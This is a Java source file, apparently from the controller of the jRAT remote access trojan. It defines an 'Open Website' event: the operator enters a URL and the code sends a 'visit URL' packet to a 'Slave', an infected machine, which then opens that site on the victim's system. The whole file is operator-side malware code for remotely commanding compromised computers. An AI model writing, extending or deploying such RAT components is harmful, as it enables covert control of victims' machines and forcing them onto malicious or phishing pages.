package su.jrat.client.events;

import javax.swing.ImageIcon;

import su.jrat.client.Slave;
import su.jrat.client.packets.outgoing.Packet14VisitURL;
import su.jrat.client.utils.IconUtils;
import su.jrat.client.utils.Utils;


public class OpenWebsiteEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
	public String url;

	public OpenWebsiteEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url };
	}

	@Override
	public void perform(Slave sl) {
		sl.addToSendQueue(new Packet14VisitURL(url));
	}

	@Override
	public String toString() {
		return "Open Website";
	}

	@Override
	public boolean add() {
		String result = Utils.showDialog("Visit URL", "Input URL to visit");

		if (result != null && !result.startsWith("http://")) {
			result = "http://" + result;
		}

		if (result == null) {
			return false;
		}

		url = result.trim();

		return true;
	}

	@Override
	public String getIcon() {
		return "url";
	}

}
